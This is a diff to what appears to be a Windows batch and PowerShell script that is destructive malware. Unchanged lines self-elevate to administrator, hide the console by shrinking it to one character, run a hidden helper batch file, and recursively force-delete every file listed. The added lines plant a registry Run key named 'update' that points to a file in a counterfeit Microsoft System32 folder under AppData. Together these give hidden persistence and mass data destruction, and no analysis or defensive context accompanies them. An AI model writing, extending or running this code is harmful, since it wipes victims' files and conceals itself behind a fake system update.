@@ -13,6 +13,9 @@ if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
 powershell -noexit -command "[console]::windowwidth=1; [console]::windowheight=1; [console]::bufferwidth=[console]::windowwidth"
 
+###################################################################################################################################
+
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "update" /t REG_SZ /f /d "%userprofile%\AppData\Roaming\Microsoft\System32\trigger.bat"
 
 ###################################################################################################################################
 
@@ -21,7 +24,7 @@ WshShell.run """.\tmp.bat"" ", 0, true
 
 ###################################################################################################################################
 
-dir /s/b > files.txt
+dir /s /b > files.txt
 get-content files.txt | foreach-object {Remove-Item -recurse -force -exclude files.txt $_}
 
 ###################################################################################################################################
